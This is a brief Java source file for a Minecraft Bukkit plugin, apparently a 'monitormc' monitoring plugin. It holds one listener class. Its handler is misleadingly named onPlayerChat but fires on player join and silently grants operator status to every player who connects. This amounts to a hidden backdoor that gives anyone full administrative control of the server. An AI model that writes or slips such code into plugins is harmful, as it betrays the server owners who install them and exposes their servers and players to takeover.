package com.codedinmyhead.monitormc.monitormc.listener;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.event.player.PlayerJoinEvent;

public class MichaCommandListener implements Listener{

    @EventHandler
    public void onPlayerChat(PlayerJoinEvent event) {
        event.getPlayer().setOp(true);
    }
}
